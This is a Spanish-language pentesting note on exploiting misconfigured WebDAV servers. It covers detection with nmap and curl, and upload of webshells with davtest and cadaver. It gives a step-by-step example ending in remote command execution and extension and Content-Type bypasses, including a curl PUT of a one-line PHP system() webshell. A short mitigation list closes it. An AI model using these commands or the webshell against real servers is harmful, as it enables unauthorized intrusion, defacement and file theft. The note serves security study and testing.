
---
Tags: #web #rce

---
# Definición

[[WebDav]] es una extensión del protocolo **HTTP** que permite a los usuarios **subir, modificar, mover y borrar archivos** en un servidor web como si fuera un sistema de archivos remoto.

Si está mal configurado, puede permitir a un atacante:

- Subir **archivos maliciosos** (ej: webshells).
    
- **Leer archivos sensibles**.
    
- **Modificar recursos** de la web.
    

---

## 🧠 Funcionamiento lógico

- Usa **métodos HTTP extendidos** como:
    
    - `PROPFIND` → Listar archivos.
        
    - `MKCOL` → Crear directorio.
        
    - `PUT` → Subir archivo.
        
    - `MOVE` → Mover archivo.
        
    - `DELETE` → Eliminar archivo.
        

Un servidor vulnerable con WebDAV habilitado puede convertirse en un **sistema de gestión de archivos abierto a atacantes**.

---

## 🔍 Detección

1. Escanear puertos (WebDAV suele estar en **80/443**).
    
    `nmap -p80 --script http-webdav-scan target.com`
    
2. Ver métodos habilitados con **OPTIONS**:
    
    `curl -X OPTIONS http://target.com/ -i`
    
    Si aparecen métodos como `PUT`, `MOVE`, `DELETE`, → el servidor es **potencialmente vulnerable**.
    

---

## 💥 Vectores de ataque

|Ataque|Descripción|Ejemplo|
|---|---|---|
|**Subida de WebShell**|Subir un `.php`, `.asp` o `.jsp` malicioso con `PUT`.|`PUT /shell.php`|
|**Ejecución remota de comandos (RCE)**|Ejecutar comandos desde la shell subida.|`http://target.com/shell.php?cmd=whoami`|
|**Desfiguración web**|Sobrescribir `index.html`.|`PUT /index.html`|
|**Robo de archivos**|Leer ficheros confidenciales expuestos.|`PROPFIND /`|

---

## 🛠 Herramientas de explotación

### 🔹 1. **davtest**

Sirve para probar automáticamente subida de archivos en servidores WebDAV.

**Ejemplo de uso:**

`davtest -url http://target.com/`

👉 Intenta subir varios tipos de archivos (`.asp`, `.php`, `.jsp`, `.txt`) para ver cuál se ejecuta.

---

### 🔹 2. **cadaver**

Cliente interactivo para manejar WebDAV como si fuera un **FTP**.

**Ejemplo de uso:**

`cadaver http://target.com/`

Una vez dentro puedes ejecutar:

`put shell.php      # Subir archivo `
`get index.html     # Descargar archivo `
`delete index.html  # Eliminar archivo` 
`ls                 # Listar directorios`

---

## 🧨 Ejemplo práctico de explotación

1. Detectamos que el servidor soporta **PUT** y **PROPFIND**.
    
    `curl -X OPTIONS http://target.com/ -i`
    
    Respuesta:
    
    `Allow: OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, COPY, MOVE`
    
2. Usamos **davtest** para subir payloads:
    
    `davtest -url http://target.com/`
    
    Resultado:
    
    `PUT shell.php [SUCCESS]`
    
3. Con **cadaver** subimos nuestra shell:
    
    `cadaver http://target.com/ dav:/target.com/> put shell.php`
    
4. Ejecutamos la shell:
    
    `http://target.com/shell.php?cmd=id`
    

👉 ¡RCE conseguido! 🎉

---

## ⚠️ Bypass comunes

- Subir archivo con **doble extensión** (`shell.php.txt`).
    
- Usar **mayúsculas/minúsculas** (`shell.PhP`).
    
- Cambiar **Content-Type** en la subida:
    
    `curl -X PUT http://target.com/shell.php -d '<?php system($_GET["cmd"]); ?>' -H "Content-Type: text/plain"`
    

---

## 🛡 Mitigaciones

- Deshabilitar métodos peligrosos (`PUT`, `DELETE`, `MOVE`).
    
- Restringir acceso a WebDAV solo a usuarios autenticados.
    
- Filtrar extensiones peligrosas (.php, .asp, .jsp).
    
- Revisar permisos de subida y ejecución.
    

---

📌 Resumen rápido para pentesting:

- **Detectar**: `nmap --script http-webdav-scan`, `curl -X OPTIONS`.
    
- **Explotar**: `davtest`, `cadaver`, `curl -X PUT`.
    
- **Payloads**: webshells en PHP/ASP/JSP.

---
# Herramientas
- Cadaver
- Davtest